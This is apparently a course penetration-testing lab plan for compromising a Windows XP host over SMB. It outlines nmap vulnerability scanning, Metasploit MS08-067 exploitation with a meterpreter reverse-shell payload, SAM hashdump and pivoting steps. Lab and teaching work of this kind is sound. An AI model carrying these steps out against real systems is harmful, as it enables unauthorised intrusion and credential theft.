# Attack plan — `10.20.160.100` (ADRASTEA / Windows XP)

**Host:** **`10.20.160.100`** · **Role:** Workgroup **JUPITER**, SMB **139/445**, optional **RDP 3389**.

**Navigation:** [Host README (full runbook)](../README.md) · [Screenshots](../Screenshots/) · [Credential pivot](../credential_pivot.md) · [Unfruitful log](../unfruitful_attempts/README.md) · [Work index](../../README.md)

---

## Phase 0 — Preconditions

- Confirm **lab scope** and **ROE**; set **`RHOST=10.20.160.100`** and a reachable **`LHOST`** on the lab network (`ip -br a`).
- Do **not** assume **null SMB** works until **`nmap`** shows **SMB open** and **`smbclient -L -N`** / **CME** agree (see [unfruitful log](../unfruitful_attempts/README.md) for a failed null enum).

## Phase 1 — Discovery

- **`nmap`** on **139, 445, 3389** with version and safe scripts (`smb-os-discovery`, **`smb-vuln-ms08-067`**, **`smb-vuln-ms17-010`** only as *hints* — **XP** pool layout matches **MS08-067**, not **EternalBlue** defaults).
- If SMB is up but **anonymous enum** fails, pivot to **credentialed** paths ([`../credential_pivot.md`](../credential_pivot.md)) or **MSF `check`** on the **right** module class.

## Phase 2 — Exploitation (validated lane)

- **`exploit/windows/smb/ms08_067_netapi`** + **`windows/meterpreter/reverse_tcp`** after **`check`** / fingerprint matches **XP SP3** (English in this lab).
- **`LHOST`** must be an IP **the victim can route to** (lab Kali interface).

## Phase 3 — Post-exploitation

- **`sysinfo`**, **`getuid`**, **`search -f proof.txt`**, then **`shell`** + **`type`** for flags (Meterpreter has no **`type`** / **`echo`**).
- **`hashdump`** for **SAM** (lab cred pivot only; keep hashes out of committed markdown).
- **`ping`** **`.101` / `.102`** from **ADRASTEA** to validate **L3** for pivot / **autoroute** if the scenario requires it.

## Phase 4 — Reporting

- Align evidence **`100-NNN_*`** under [`../Screenshots/`](../Screenshots/) with the course rubric; promote to team **`1_Screenshots/`** when final.

---

**Full command blocks, MSF notes, and evidence tables:** [../README.md](../README.md).
